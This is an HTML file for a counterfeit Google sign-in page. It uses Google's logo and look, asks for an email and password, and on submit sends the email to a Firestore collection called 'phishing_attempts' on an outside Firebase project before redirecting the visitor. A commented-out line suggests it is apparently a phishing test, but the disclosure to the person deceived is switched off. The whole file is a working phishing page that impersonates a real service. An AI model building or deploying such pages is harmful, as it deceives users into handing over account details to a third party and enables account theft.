<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Signin</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 40px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
            border-radius: 8px;
            width: 360px;
            text-align: center;
        }
        .container img {
            width: 120px; /* Increased size */
            margin-bottom: 20px;
        }
        .container h2 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 20px;
        }
        input {
            display: block;
            width: 100%;
            margin: 10px 0;
            padding: 12px;
            font-size: 14px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 3px rgba(26, 115, 232, 0.5);
        }
        button {
            background: #1a73e8;
            color: white;
            padding: 12px;
            width: 100%;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background: #1669c1;
        }
        p#message {
            margin-top: 20px;
            font-size: 14px;
            color: #5f6368;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #5f6368;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Google Logo -->
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
        <h2>Sign in</h2>
        <form id="phishingForm">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <p id="message"></p>
        <div class="footer">Not your computer? Use Guest mode to sign in privately.</div>
    </div>

    <!-- Firebase Integration -->
    <script type="module">
        // Import Firebase modules (modular SDK)
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";

        // Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCvZjTxoJCup0fSPgDDUDsAAJVAKy9H6Kg",
            authDomain: "queenlake-test.firebaseapp.com",
            projectId: "queenlake-test",
            storageBucket: "queenlake-test.firebasestorage.app",
            messagingSenderId: "874136375125",
            appId: "1:874136375125:web:a1bd4d03f6f2939a10e9dc",
            measurementId: "G-VG5L9679DB"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Handle Form Submission
        document.getElementById("phishingForm").addEventListener("submit", async function(event) {
            event.preventDefault();
            const email = document.getElementById("email").value;

            try {
                // Store email in Firestore
                await addDoc(collection(db, "phishing_attempts"), {
                    email: email,
                    timestamp: new Date()
                });

                //document.getElementById("message").innerText = "Security Alert: This was a phishing test!";
                setTimeout(() => { window.location.href = "access.html"; }, 2000);
            } catch (error) {
                console.error("Error adding document: ", error);
                document.getElementById("message").innerText = "Error storing data.";
            }
        });
    </script>
</body>
</html>
